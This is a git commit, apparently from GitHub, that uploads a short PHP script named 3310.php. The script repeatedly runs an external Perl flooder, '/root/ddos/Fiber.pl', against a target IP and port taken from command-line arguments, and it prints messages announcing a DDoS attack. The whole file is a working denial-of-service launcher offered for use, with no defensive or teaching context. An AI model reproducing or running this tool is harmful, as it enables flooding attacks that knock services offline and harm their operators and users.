f2d22c0ab5d12498ab2fc850c3202ccbd8355a8b
dogter1 <49182050+dogter1@users.noreply.github.com>
2022-07-02 09:34:55 +0700

    Add files via upload

---
+++ 3310.php
@@ -0,0 +1,8 @@
+<?php
+for ($x = 1; $x <= $argv[3]; $x++) {
+	$rand = rand(1,30);
+	print " Start attack ..";
+	exec('/root/ddos/Fiber.pl '.$argv[1].' '.$argv[2].' 0 '.$rand.'');
+	echo "TART DDOS BY The DOG IP ".$argv[1].":".$argv[2]." TIME $x \n";
+}
+?>
